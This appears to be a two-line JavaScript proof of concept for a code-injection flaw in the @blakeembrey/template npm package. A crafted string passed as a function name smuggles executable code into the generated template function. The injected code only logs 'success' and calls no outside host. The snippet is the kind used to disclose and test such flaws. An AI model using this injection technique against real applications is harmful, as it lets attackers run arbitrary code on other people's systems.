const { template } = require("@blakeembrey/template");

template("Hello {{name}}!", "exploit() {} && ((()=>{ console.log('success'); })()) && function pwned");
